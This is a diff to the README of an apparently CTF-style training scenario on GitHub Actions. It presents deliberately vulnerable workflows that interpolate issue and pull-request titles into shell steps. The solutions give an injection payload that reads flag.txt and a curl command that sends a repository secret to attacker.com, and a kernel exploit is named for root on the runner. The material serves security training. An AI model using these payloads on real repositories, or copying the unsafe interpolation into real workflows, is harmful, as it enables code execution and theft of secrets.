@@ -9,7 +9,6 @@ This scenario is a CTF-style challenge that will test your knowledge of GitHub A
 The first challenge is a simple command injection vulnerability. You will need to find a way to execute arbitrary commands on the runner.
 
 **Vulnerable Code:**
-
 ```yaml
 name: Challenge 1
 on:
@@ -22,6 +21,7 @@ jobs:
       - name: Challenge 1
         run: |
           echo "The flag is in a file called flag.txt"
+          echo "flag{this_is_the_flag}" > flag.txt
           echo "Your input: ${{ github.event.issue.title }}"
 ```
 
@@ -31,7 +31,7 @@ Try to use a shell command to read the contents of the `flag.txt` file.
 
 **Solution:**
 
-Create an issue with the title `'; cat flag.txt'`.
+Create an issue with the title: `'; cat flag.txt'`
 
 ## Challenge 2: Secret Exfiltration
 
@@ -40,7 +40,6 @@ Create an issue with the title `'; cat flag.txt'`.
 The second challenge is a secret exfiltration vulnerability. You will need to find a way to exfiltrate a secret from the workflow.
 
 **Vulnerable Code:**
-
 ```yaml
 name: Challenge 2
 on:
@@ -62,7 +61,7 @@ Try to use a shell command to exfiltrate the secret to a third-party service.
 
 **Solution:**
 
-Create a pull request with the title `'; curl http://attacker.com/?flag=${{ secrets.FLAG }}'`.
+Create a pull request with the title: `'; curl http://attacker.com/?flag=${{ secrets.FLAG }}'`
 
 ## Challenge 3: Privilege Escalation
 
@@ -71,7 +70,6 @@ Create a pull request with the title `'; curl http://attacker.com/?flag=${{ secr
 The third challenge is a privilege escalation vulnerability. You will need to find a way to escalate your privileges on the runner.
 
 **Vulnerable Code:**
-
 ```yaml
 name: Challenge 3
 on:
@@ -103,7 +101,7 @@ Use a kernel exploit to gain root access to the host machine and then read the c
 
 ### Creating the flags
 
-1.  For challenge 1, create a file called `flag.txt` in the root of the repository with the flag.
+1.  For challenge 1, the flag is created dynamically in the workflow.
 2.  For challenge 2, create a secret called `FLAG` with the flag.
 3.  For challenge 3, create a file called `flag.txt` in the `/root` directory of the self-hosted runner with the flag.
 
